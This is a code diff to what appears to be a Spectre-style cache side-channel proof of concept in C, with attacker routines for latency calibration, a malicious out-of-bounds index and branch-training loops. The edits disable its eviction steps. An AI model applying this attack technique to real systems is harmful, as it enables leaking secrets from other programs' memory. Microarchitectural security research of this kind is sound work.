@@ -250,7 +250,7 @@ int naive_victim(uint8_t *pages, int32_t idx, size_t stride) {
 void naive_attacker() {
     timer_init(true, 1);
     uint64_t threshold = calibrate_latency();
-    find_fuzzy_eviction_set();
+    // find_fuzzy_eviction_set();
     printf("-----------------------------------------\n");
     uint64_t hits[SYMBOL_CNT] = { 0 };
     char buf[256] = { '\0' };
@@ -273,14 +273,16 @@ void naive_attacker() {
     printf("The malicious index is %p-%p=%#x\n", use_this, array,
            malicious_index);
     printf("-----------------------------------------\n");
-    uint64_t fuzzy_evict_got_it_wrong = 0;
+    
+    //uint32_t set_size = find_eviction_set()
+
     for (size_t c = 0; c < strlen(use_this); c++) {
         for (size_t r = 0; r < 200; r++) {
             for (size_t t = 0; t < 16; t++) {
                 bool is_attack = (t % 8 == 8 - 1);
                 int32_t index = cselect(malicious_index + c, 0, is_attack);
                 
-                fuzzy_evict();
+                //evict(set_size);
                 fence();
 
                 
@@ -304,7 +306,7 @@ void naive_attacker() {
     return;
 }
 
-int main(int argc, char **argv) {
+int main1(int argc, char **argv) {
     flush_buffer = (uint8_t*)malloc(256 * PAGE_SIZE);
 
     // Choose which cache line within the page to place the secret on.
